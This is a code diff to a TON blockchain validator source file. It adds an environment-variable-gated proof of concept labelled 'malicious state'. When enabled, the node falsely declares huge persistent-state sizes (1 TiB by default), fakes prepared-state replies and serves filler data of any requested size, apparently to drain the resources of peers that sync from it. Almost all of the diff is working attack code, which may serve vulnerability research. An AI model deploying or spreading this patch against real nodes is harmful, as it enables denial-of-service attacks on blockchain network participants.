@@ -1,0 +1,95 @@
+diff --git a/validator/full-node-shard.cpp b/validator/full-node-shard.cpp
+index 5ba195e6..e93b3629 100644
+--- a/validator/full-node-shard.cpp
++++ b/validator/full-node-shard.cpp
+@@ -36,6 +36,9 @@
+ #include "ton/ton-shard.h"
+ #include "ton/ton-tl.hpp"
+
++#include <atomic>
++#include <cstdlib>
++
+ #include "checksum.h"
+ #include "full-node-serializer.hpp"
+ #include "full-node-shard-queries.hpp"
+@@ -53,6 +56,25 @@ namespace {
+ constexpr const char *k_called_from_public = "public";
+ constexpr td::uint32 k_heavy_request_cost_unit = 1 << 21;
+ constexpr size_t k_ed25519_signature_size = 64;
++constexpr td::uint64 k_default_malicious_state_size = 1ULL << 40;
++
++bool malicious_state_poc_enabled() {
++  const char *value = std::getenv("TON_POC_MALICIOUS_STATE");
++  return value != nullptr && value[0] != '\0' && value[0] != '0';
++}
++
++td::uint64 malicious_state_declared_size() {
++  const char *value = std::getenv("TON_POC_MALICIOUS_STATE_SIZE");
++  if (value == nullptr || value[0] == '\0') {
++    return k_default_malicious_state_size;
++  }
++  char *end = nullptr;
++  auto parsed = std::strtoull(value, &end, 10);
++  return end != value && parsed > 0 ? parsed : k_default_malicious_state_size;
++}
++
++std::atomic<td::uint64> malicious_state_slice_count{0};
++std::atomic<td::uint64> malicious_state_bytes_sent{0};
+
+ size_t heavy_request_cost(td::uint64 requested_max_size) {
+   size_t cost = static_cast<size_t>((requested_max_size + k_heavy_request_cost_unit - 1) / k_heavy_request_cost_unit);
+@@ -530,6 +552,15 @@ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNod
+
+ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNode_preparePersistentState &query,
+                                       td::Promise<td::BufferSlice> promise) {
++  if (malicious_state_poc_enabled()) {
++    auto block_id = create_block_id(query.block_);
++    auto masterchain_block_id = create_block_id(query.masterchain_block_);
++    LOG(WARNING) << "TON_POC_MALICIOUS_STATE preparePersistentState from " << src << " block=" << block_id
++                 << " mc=" << masterchain_block_id << " -> preparedState";
++    promise.set_value(create_serialize_tl_object<ton_api::tonNode_preparedState>());
++    return;
++  }
++
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::uint64> R) mutable {
+         if (R.is_error()) {
+@@ -707,6 +738,20 @@ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNod
+     promise.set_error(td::Status::Error(ErrorCode::protoviolation, "invalid max_size"));
+     return;
+   }
++  if (malicious_state_poc_enabled()) {
++    auto returned_size = static_cast<size_t>(query.max_size_);
++    td::BufferSlice response{returned_size};
++    response.as_slice().fill(static_cast<char>(malicious_state_slice_count.load(std::memory_order_relaxed) & 0xff));
++    auto slice_no = malicious_state_slice_count.fetch_add(1, std::memory_order_relaxed) + 1;
++    auto cumulative = malicious_state_bytes_sent.fetch_add(returned_size, std::memory_order_relaxed) + returned_size;
++    LOG(WARNING) << "TON_POC_MALICIOUS_STATE downloadPersistentStateSliceV2 slice=" << slice_no << " from=" << src
++                 << " block=" << block_id << " mc=" << mc_block_id << " state_type="
++                 << persistent_state_type_to_string(block_id.shard_full(), state_type) << " offset=" << query.offset_
++                 << " requested=" << query.max_size_ << " returned=" << returned_size
++                 << " cumulative_bytes=" << cumulative;
++    promise.set_value(std::move(response));
++    return;
++  }
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::BufferSlice> R) mutable {
+         if (R.is_error()) {
+@@ -722,6 +767,17 @@ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNod
+
+ void FullNodeShardImpl::process_query(adnl::AdnlNodeIdShort src, ton_api::tonNode_getPersistentStateSizeV2 &query,
+                                       td::Promise<td::BufferSlice> promise) {
++  if (malicious_state_poc_enabled()) {
++    auto [block_id, mc_block_id, state_type] = persistent_state_from_v2_query(query);
++    auto declared_size = malicious_state_declared_size();
++    LOG(WARNING) << "TON_POC_MALICIOUS_STATE getPersistentStateSizeV2 from " << src << " block=" << block_id
++                 << " mc=" << mc_block_id << " state_type="
++                 << persistent_state_type_to_string(block_id.shard_full(), state_type)
++                 << " -> declared_size=" << declared_size;
++    promise.set_value(create_serialize_tl_object<ton_api::tonNode_persistentStateSize>(declared_size));
++    return;
++  }
++
+   auto P = td::PromiseCreator::lambda(
+       [SelfId = actor_id(this), promise = std::move(promise)](td::Result<td::uint64> R) mutable {
+         if (R.is_error()) {
